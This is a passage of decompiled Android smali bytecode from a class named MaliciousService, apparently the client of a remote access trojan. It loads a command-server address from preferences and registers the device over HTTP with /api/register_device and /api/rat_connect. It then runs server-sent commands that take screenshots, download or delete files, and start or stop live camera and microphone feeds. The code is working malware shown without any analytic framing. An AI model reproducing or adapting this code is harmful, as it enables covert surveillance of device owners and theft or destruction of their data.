    invoke-direct {p0}, Lcom/example/android/MaliciousService;->takeScreenshot()V

    .line 597
    const/4 v0, 0x0

    return-object v0
.end method

.method private synthetic lambda$executeCommand$1()Ljava/lang/Void;
    .registers 2
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Exception;
        }
    .end annotation

    .line 602
    invoke-direct {p0}, Lcom/example/android/MaliciousService;->downloadFile()V

    .line 603
    const/4 v0, 0x0

    return-object v0
.end method

.method private synthetic lambda$executeCommand$2()Ljava/lang/Void;
    .registers 2
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Exception;
        }
    .end annotation

    .line 608
    invoke-direct {p0}, Lcom/example/android/MaliciousService;->deleteFile()V

    .line 609
    const/4 v0, 0x0

    return-object v0
.end method

.method private synthetic lambda$executeCommand$3()Ljava/lang/Void;
    .registers 2
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Exception;
        }
    .end annotation

    .line 614
    invoke-direct {p0}, Lcom/example/android/MaliciousService;->startLiveCamera()V

    .line 615
    const/4 v0, 0x0

    return-object v0
.end method

.method private synthetic lambda$executeCommand$4()Ljava/lang/Void;
    .registers 2
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Exception;
        }
    .end annotation

    .line 620
    invoke-direct {p0}, Lcom/example/android/MaliciousService;->startLiveMic()V

    .line 621
    const/4 v0, 0x0

    return-object v0
.end method

.method private synthetic lambda$executeCommand$5()Ljava/lang/Void;
    .registers 2
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Exception;
        }
    .end annotation

    .line 626
    invoke-direct {p0}, Lcom/example/android/MaliciousService;->stopLiveCamera()V

    .line 627
    const/4 v0, 0x0

    return-object v0
.end method

.method private synthetic lambda$executeCommand$6()Ljava/lang/Void;
    .registers 2
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Exception;
        }
    .end annotation

    .line 632
    invoke-direct {p0}, Lcom/example/android/MaliciousService;->stopLiveMic()V

    .line 633
    const/4 v0, 0x0

    return-object v0
.end method

.method private loadServerConfigFromPreferences()V
    .registers 7

    .line 229
    const-string v0, "RAT_DEVICE_PREFS"

    const/4 v1, 0x0

    invoke-virtual {p0, v0, v1}, Lcom/example/android/MaliciousService;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v0

    .line 230
    const-string v1, "server_ip"

    const/4 v2, 0x0

    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    iput-object v1, p0, Lcom/example/android/MaliciousService;->SERVER_IP:Ljava/lang/String;

    .line 231
    const-string v1, "flask_port"

    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    iput-object v1, p0, Lcom/example/android/MaliciousService;->FLASK_PORT:Ljava/lang/String;

    .line 232
    const-string v1, "rat_port"

    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lcom/example/android/MaliciousService;->RAT_PORT:Ljava/lang/String;

    .line 233
    iget-object v0, p0, Lcom/example/android/MaliciousService;->SERVER_IP:Ljava/lang/String;

    const-string v1, "MaliciousService"

    if-eqz v0, :cond_67

    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v0

    if-nez v0, :cond_67

    iget-object v0, p0, Lcom/example/android/MaliciousService;->FLASK_PORT:Ljava/lang/String;

    if-eqz v0, :cond_67

    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v0

    if-nez v0, :cond_67

    .line 234
    iget-object v0, p0, Lcom/example/android/MaliciousService;->SERVER_IP:Ljava/lang/String;

    iget-object v2, p0, Lcom/example/android/MaliciousService;->FLASK_PORT:Ljava/lang/String;

    iget-object v3, p0, Lcom/example/android/MaliciousService;->RAT_PORT:Ljava/lang/String;

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "Loaded server config from SharedPreferences: IP="

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v4, ", Flask Port="

    invoke-virtual {v0, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v2, ", RAT Port="

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v1, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_72

    .line 236
    :cond_67
    const-string v0, "Server IP/Flask Port not found in SharedPreferences."

    invoke-static {v1, v0}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    .line 237
    iput-object v2, p0, Lcom/example/android/MaliciousService;->SERVER_IP:Ljava/lang/String;

    .line 238
    iput-object v2, p0, Lcom/example/android/MaliciousService;->FLASK_PORT:Ljava/lang/String;

    .line 239
    iput-object v2, p0, Lcom/example/android/MaliciousService;->RAT_PORT:Ljava/lang/String;

    .line 241
    :goto_72
    return-void
.end method

.method private registerDeviceWithFlaskServer()V
    .registers 12

    .line 415
    const-string v0, "server_config"

    const-string v1, ":"

    iget-object v2, p0, Lcom/example/android/MaliciousService;->SERVER_IP:Ljava/lang/String;

    .line 416
    iget-object v3, p0, Lcom/example/android/MaliciousService;->FLASK_PORT:Ljava/lang/String;

    .line 417
    const-string v4, "MaliciousService"

    if-eqz v2, :cond_19c

    if-eqz v3, :cond_19c

    iget-object v5, p0, Lcom/example/android/MaliciousService;->uniqueDeviceId:Ljava/lang/String;

    if-nez v5, :cond_14

    goto/16 :goto_19c

    .line 421
    :cond_14
    nop

    .line 423
    const/4 v5, 0x0

    :try_start_16
    new-instance v6, Ljava/net/URL;

    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    const-string v8, "http://"

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    const-string v8, "/api/register_device"

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-direct {v6, v7}, Ljava/net/URL;-><init>(Ljava/lang/String;)V

    .line 424
    invoke-virtual {v6}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;

    move-result-object v6

    check-cast v6, Ljava/net/HttpURLConnection;
    :try_end_42
    .catch Ljava/io/IOException; {:try_start_16 .. :try_end_42} :catch_175
    .catch Lorg/json/JSONException; {:try_start_16 .. :try_end_42} :catch_173
    .catchall {:try_start_16 .. :try_end_42} :catchall_171

    .line 425
    :try_start_42
    const-string v5, "POST"

    invoke-virtual {v6, v5}, Ljava/net/HttpURLConnection;->setRequestMethod(Ljava/lang/String;)V

    .line 426
    const-string v5, "Content-Type"

    const-string v7, "application/json; charset=utf-8"

    invoke-virtual {v6, v5, v7}, Ljava/net/HttpURLConnection;->setRequestProperty(Ljava/lang/String;Ljava/lang/String;)V

    .line 427
    const/4 v5, 0x1

    invoke-virtual {v6, v5}, Ljava/net/HttpURLConnection;->setDoOutput(Z)V

    .line 428
    const/16 v5, 0x2710

    invoke-virtual {v6, v5}, Ljava/net/HttpURLConnection;->setConnectTimeout(I)V

    .line 429
    invoke-virtual {v6, v5}, Ljava/net/HttpURLConnection;->setReadTimeout(I)V

    .line 430
    new-instance v5, Lorg/json/JSONObject;

    invoke-direct {v5}, Lorg/json/JSONObject;-><init>()V

    .line 431
    const-string v7, "device_id"

    iget-object v8, p0, Lcom/example/android/MaliciousService;->uniqueDeviceId:Ljava/lang/String;

    invoke-virtual {v5, v7, v8}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 432
    const-string v7, "device_type"

    sget-object v8, Landroid/os/Build;->MODEL:Ljava/lang/String;

    invoke-virtual {v5, v7, v8}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 433
    invoke-virtual {v6}, Ljava/net/HttpURLConnection;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v7
    :try_end_71
    .catch Ljava/io/IOException; {:try_start_42 .. :try_end_71} :catch_16e
    .catch Lorg/json/JSONException; {:try_start_42 .. :try_end_71} :catch_16c
    .catchall {:try_start_42 .. :try_end_71} :catchall_169

    .line 434
    :try_start_71
    invoke-virtual {v5}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v5

    sget-object v8, Ljava/nio/charset/StandardCharsets;->UTF_8:Ljava/nio/charset/Charset;

    invoke-virtual {v5, v8}, Ljava/lang/String;->getBytes(Ljava/nio/charset/Charset;)[B

    move-result-object v5

    invoke-virtual {v7, v5}, Ljava/io/OutputStream;->write([B)V

    .line 435
    invoke-virtual {v7}, Ljava/io/OutputStream;->flush()V
    :try_end_81
    .catchall {:try_start_71 .. :try_end_81} :catchall_15d

    .line 436
    if-eqz v7, :cond_86

    :try_start_83
    invoke-virtual {v7}, Ljava/io/OutputStream;->close()V

    .line 437
    :cond_86
    invoke-virtual {v6}, Ljava/net/HttpURLConnection;->getResponseCode()I

    move-result v5

    .line 438
    const/16 v7, 0xc8

    if-ne v5, v7, :cond_141

    .line 439
    invoke-virtual {v6}, Ljava/net/HttpURLConnection;->getInputStream()Ljava/io/InputStream;

    move-result-object v5
    :try_end_92
    .catch Ljava/io/IOException; {:try_start_83 .. :try_end_92} :catch_16e
    .catch Lorg/json/JSONException; {:try_start_83 .. :try_end_92} :catch_16c
    .catchall {:try_start_83 .. :try_end_92} :catchall_169

    .line 440
    :try_start_92
    new-instance v7, Ljava/io/BufferedReader;

    new-instance v8, Ljava/io/InputStreamReader;

    invoke-direct {v8, v5}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V

    invoke-direct {v7, v8}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V
    :try_end_9c
    .catchall {:try_start_92 .. :try_end_9c} :catchall_135

    .line 441
    :try_start_9c
    new-instance v8, Ljava/lang/StringBuilder;

    invoke-direct {v8}, Ljava/lang/StringBuilder;-><init>()V

    .line 443
    :goto_a1
    invoke-virtual {v7}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v9

    if-eqz v9, :cond_ab

    .line 444
    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    goto :goto_a1

    .line 446
    :cond_ab
    new-instance v9, Lorg/json/JSONObject;

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    invoke-direct {v9, v8}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V

    .line 447
    const-string v8, "status"

    invoke-virtual {v9, v8}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    const-string v10, "registered"

    invoke-virtual {v8, v10}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v8

    if-eqz v8, :cond_11d

    .line 448
    new-instance v8, Ljava/lang/StringBuilder;

    invoke-direct {v8}, Ljava/lang/StringBuilder;-><init>()V

    const-string v10, "Device registered successfully with server: "

    invoke-virtual {v8, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v4, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 449
    invoke-virtual {v9, v0}, Lorg/json/JSONObject;->has(Ljava/lang/String;)Z

    move-result v1

    if-eqz v1, :cond_122

    .line 450
    invoke-virtual {v9, v0}, Lorg/json/JSONObject;->getJSONObject(Ljava/lang/String;)Lorg/json/JSONObject;

    move-result-object v0

    .line 451
    const-string v1, "ip"

    invoke-virtual {v0, v1}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 452
    const-string v2, "port"

    invoke-virtual {v0, v2}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 453
    if-eqz v1, :cond_11c

    invoke-virtual {v1}, Ljava/lang/String;->isEmpty()Z

    move-result v2

    if-nez v2, :cond_11c

    if-eqz v0, :cond_11c

    .line 454
    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v2

    if-nez v2, :cond_11c

    .line 455
    iget-object v2, p0, Lcom/example/android/MaliciousService;->SERVER_IP:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_116

    iget-object v2, p0, Lcom/example/android/MaliciousService;->FLASK_PORT:Ljava/lang/String;

    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-nez v2, :cond_11c

    .line 456
    :cond_116
    invoke-direct {p0, v1, v0}, Lcom/example/android/MaliciousService;->saveServerConfigToPreferences(Ljava/lang/String;Ljava/lang/String;)V

    .line 457
    invoke-direct {p0}, Lcom/example/android/MaliciousService;->loadServerConfigFromPreferences()V

    .line 460
    :cond_11c
    goto :goto_122

    .line 462
    :cond_11d
    const-string v0, "Server registration status not \'registered\'."

    invoke-static {v4, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_122
    .catchall {:try_start_9c .. :try_end_122} :catchall_12b

    .line 464
    :cond_122
    :goto_122
    :try_start_122
    invoke-virtual {v7}, Ljava/io/BufferedReader;->close()V
    :try_end_125
    .catchall {:try_start_122 .. :try_end_125} :catchall_135

    if-eqz v5, :cond_12a

    :try_start_127
    invoke-virtual {v5}, Ljava/io/InputStream;->close()V
    :try_end_12a
    .catch Ljava/io/IOException; {:try_start_127 .. :try_end_12a} :catch_16e
    .catch Lorg/json/JSONException; {:try_start_127 .. :try_end_12a} :catch_16c
    .catchall {:try_start_127 .. :try_end_12a} :catchall_169

    .line 439
    :cond_12a
    goto :goto_157

    :catchall_12b
    move-exception v0

    :try_start_12c
    invoke-virtual {v7}, Ljava/io/BufferedReader;->close()V
    :try_end_12f
    .catchall {:try_start_12c .. :try_end_12f} :catchall_130

    goto :goto_134

    :catchall_130
    move-exception v1

    :try_start_131
    invoke-static {v0, v1}, Lcom/example/android/MaliciousService$$ExternalSyntheticBackport0;->m(Ljava/lang/Throwable;Ljava/lang/Throwable;)V

    :goto_134
    throw v0
    :try_end_135
    .catchall {:try_start_131 .. :try_end_135} :catchall_135

    :catchall_135
    move-exception v0

    if-eqz v5, :cond_140

    :try_start_138
    invoke-virtual {v5}, Ljava/io/InputStream;->close()V
    :try_end_13b
    .catchall {:try_start_138 .. :try_end_13b} :catchall_13c

    goto :goto_140

    :catchall_13c
    move-exception v1

    :try_start_13d
    invoke-static {v0, v1}, Lcom/example/android/MaliciousService$$ExternalSyntheticBackport0;->m(Ljava/lang/Throwable;Ljava/lang/Throwable;)V

    :cond_140
    :goto_140
    throw v0

    .line 466
    :cond_141
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "Server responded with non-OK code for registration: "

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, v5}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v4, v0}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_157
    .catch Ljava/io/IOException; {:try_start_13d .. :try_end_157} :catch_16e
    .catch Lorg/json/JSONException; {:try_start_13d .. :try_end_157} :catch_16c
    .catchall {:try_start_13d .. :try_end_157} :catchall_169

    .line 471
    :goto_157
    if-eqz v6, :cond_195

    .line 472
    invoke-virtual {v6}, Ljava/net/HttpURLConnection;->disconnect()V

    goto :goto_195

    .line 433
    :catchall_15d
    move-exception v0

    if-eqz v7, :cond_168

    :try_start_160
    invoke-virtual {v7}, Ljava/io/OutputStream;->close()V
    :try_end_163
    .catchall {:try_start_160 .. :try_end_163} :catchall_164

    goto :goto_168

    :catchall_164
    move-exception v1

    :try_start_165
    invoke-static {v0, v1}, Lcom/example/android/MaliciousService$$ExternalSyntheticBackport0;->m(Ljava/lang/Throwable;Ljava/lang/Throwable;)V

    :cond_168
    :goto_168
    throw v0
    :try_end_169
    .catch Ljava/io/IOException; {:try_start_165 .. :try_end_169} :catch_16e
    .catch Lorg/json/JSONException; {:try_start_165 .. :try_end_169} :catch_16c
    .catchall {:try_start_165 .. :try_end_169} :catchall_169

    .line 471
    :catchall_169
    move-exception v0

    move-object v5, v6

    goto :goto_196

    .line 468
    :catch_16c
    move-exception v0

    goto :goto_16f

    :catch_16e
    move-exception v0

    :goto_16f
    move-object v5, v6

    goto :goto_176

    .line 471
    :catchall_171
    move-exception v0

    goto :goto_196

    .line 468
    :catch_173
    move-exception v0

    goto :goto_176

    :catch_175
    move-exception v0

    .line 469
    :goto_176
    :try_start_176
    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v0

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "Failed to register device with server: "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v4, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_190
    .catchall {:try_start_176 .. :try_end_190} :catchall_171

    .line 471
    if-eqz v5, :cond_195

    .line 472
    invoke-virtual {v5}, Ljava/net/HttpURLConnection;->disconnect()V

    .line 475
    :cond_195
    :goto_195
    return-void

    .line 471
    :goto_196
    if-eqz v5, :cond_19b

    .line 472
    invoke-virtual {v5}, Ljava/net/HttpURLConnection;->disconnect()V

    .line 474
    :cond_19b
    throw v0

    .line 418
    :cond_19c
    :goto_19c
    const-string v0, "Server IP/Flask Port not loaded or Device ID not ready, cannot register device."

    invoke-static {v4, v0}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    .line 419
    return-void
.end method

.method private registerDeviceWithServer()V
    .registers 13

    .line 344
    const-string v0, "commands"

    const-string v1, ":"

    iget-object v2, p0, Lcom/example/android/MaliciousService;->SERVER_IP:Ljava/lang/String;

    .line 345
    iget-object v3, p0, Lcom/example/android/MaliciousService;->FLASK_PORT:Ljava/lang/String;

    .line 346
    const-string v4, "MaliciousService"

    if-eqz v2, :cond_197

    if-eqz v3, :cond_197

    iget-object v5, p0, Lcom/example/android/MaliciousService;->uniqueDeviceId:Ljava/lang/String;

    if-nez v5, :cond_14

    goto/16 :goto_197

    .line 352
    :cond_14
    nop

    .line 354
    const/4 v5, 0x0

    :try_start_16
    new-instance v6, Ljava/net/URL;

    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    const-string v8, "http://"

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    const-string v8, "/api/rat_connect"

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-direct {v6, v7}, Ljava/net/URL;-><init>(Ljava/lang/String;)V

    .line 355
    invoke-virtual {v6}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;

    move-result-object v6

    check-cast v6, Ljava/net/HttpURLConnection;
    :try_end_42
    .catch Ljava/io/IOException; {:try_start_16 .. :try_end_42} :catch_170
    .catch Lorg/json/JSONException; {:try_start_16 .. :try_end_42} :catch_16e
    .catchall {:try_start_16 .. :try_end_42} :catchall_16c

    .line 356
    :try_start_42
    const-string v5, "POST"

    invoke-virtual {v6, v5}, Ljava/net/HttpURLConnection;->setRequestMethod(Ljava/lang/String;)V

    .line 357
    const-string v5, "Content-Type"

    const-string v7, "application/json; charset=utf-8"

    invoke-virtual {v6, v5, v7}, Ljava/net/HttpURLConnection;->setRequestProperty(Ljava/lang/String;Ljava/lang/String;)V

    .line 358
    const/4 v5, 0x1

    invoke-virtual {v6, v5}, Ljava/net/HttpURLConnection;->setDoOutput(Z)V

    .line 359
    const/16 v5, 0x2710

    invoke-virtual {v6, v5}, Ljava/net/HttpURLConnection;->setConnectTimeout(I)V

    .line 360
    invoke-virtual {v6, v5}, Ljava/net/HttpURLConnection;->setReadTimeout(I)V

    .line 362
    new-instance v5, Lorg/json/JSONObject;

    invoke-direct {v5}, Lorg/json/JSONObject;-><init>()V

    .line 363
    const-string v7, "device_id"

    iget-object v8, p0, Lcom/example/android/MaliciousService;->uniqueDeviceId:Ljava/lang/String;

    invoke-virtual {v5, v7, v8}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 364
    const-string v7, "device_type"

    sget-object v8, Landroid/os/Build;->MODEL:Ljava/lang/String;

    invoke-virtual {v5, v7, v8}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 365
    const-string v7, "connection_type"

    const-string v8, "register"

    invoke-virtual {v5, v7, v8}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 367
    invoke-virtual {v6}, Ljava/net/HttpURLConnection;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v7
    :try_end_78
    .catch Ljava/io/IOException; {:try_start_42 .. :try_end_78} :catch_169
    .catch Lorg/json/JSONException; {:try_start_42 .. :try_end_78} :catch_167
    .catchall {:try_start_42 .. :try_end_78} :catchall_164

    .line 368
    :try_start_78
    invoke-virtual {v5}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v5

    sget-object v8, Ljava/nio/charset/StandardCharsets;->UTF_8:Ljava/nio/charset/Charset;

    invoke-virtual {v5, v8}, Ljava/lang/String;->getBytes(Ljava/nio/charset/Charset;)[B

    move-result-object v5

    invoke-virtual {v7, v5}, Ljava/io/OutputStream;->write([B)V

    .line 369
    invoke-virtual {v7}, Ljava/io/OutputStream;->flush()V
    :try_end_88
    .catchall {:try_start_78 .. :try_end_88} :catchall_158

    .line 370
    if-eqz v7, :cond_8d

    :try_start_8a
    invoke-virtual {v7}, Ljava/io/OutputStream;->close()V

    .line 372
    :cond_8d
    invoke-virtual {v6}, Ljava/net/HttpURLConnection;->getResponseCode()I

    move-result v5

    .line 373
    const/16 v7, 0xc8

    if-ne v5, v7, :cond_13c

    .line 374
    invoke-virtual {v6}, Ljava/net/HttpURLConnection;->getInputStream()Ljava/io/InputStream;

    move-result-object v5
    :try_end_99
    .catch Ljava/io/IOException; {:try_start_8a .. :try_end_99} :catch_169
    .catch Lorg/json/JSONException; {:try_start_8a .. :try_end_99} :catch_167
    .catchall {:try_start_8a .. :try_end_99} :catchall_164

    .line 375
    :try_start_99
    new-instance v7, Ljava/io/BufferedReader;

    new-instance v8, Ljava/io/InputStreamReader;

    invoke-direct {v8, v5}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V

    invoke-direct {v7, v8}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V
    :try_end_a3
    .catchall {:try_start_99 .. :try_end_a3} :catchall_130

    .line 376
    :try_start_a3
    new-instance v8, Ljava/lang/StringBuilder;

    invoke-direct {v8}, Ljava/lang/StringBuilder;-><init>()V

    .line 378
    :goto_a8
    invoke-virtual {v7}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v9

    if-eqz v9, :cond_b2

    .line 379
    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    goto :goto_a8

    .line 382
    :cond_b2
    new-instance v9, Lorg/json/JSONObject;

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v10

    invoke-direct {v9, v10}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V

    .line 383
    const-string v10, "status"

    invoke-virtual {v9, v10}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v10

    const-string v11, "connected"

    invoke-virtual {v10, v11}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v10

    if-eqz v10, :cond_103

    .line 384
    new-instance v8, Ljava/lang/StringBuilder;

    invoke-direct {v8}, Ljava/lang/StringBuilder;-><init>()V

    const-string v10, "Device registered successfully with Flask server: "

    invoke-virtual {v8, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v4, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 387
    invoke-virtual {v9, v0}, Lorg/json/JSONObject;->has(Ljava/lang/String;)Z

    move-result v1

    if-eqz v1, :cond_11d

    .line 388
    invoke-virtual {v9, v0}, Lorg/json/JSONObject;->getJSONArray(Ljava/lang/String;)Lorg/json/JSONArray;

    move-result-object v0

    .line 389
    const/4 v1, 0x0

    :goto_f2
    invoke-virtual {v0}, Lorg/json/JSONArray;->length()I

    move-result v2

    if-ge v1, v2, :cond_102

    .line 390
    invoke-virtual {v0, v1}, Lorg/json/JSONArray;->getString(I)Ljava/lang/String;

    move-result-object v2

    .line 391
    invoke-direct {p0, v2}, Lcom/example/android/MaliciousService;->executeCommand(Ljava/lang/String;)V

    .line 389
    add-int/lit8 v1, v1, 0x1

    goto :goto_f2

    .line 393
    :cond_102
    goto :goto_11d

    .line 395
    :cond_103
    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "Registration failed. Server response: "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v4, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I
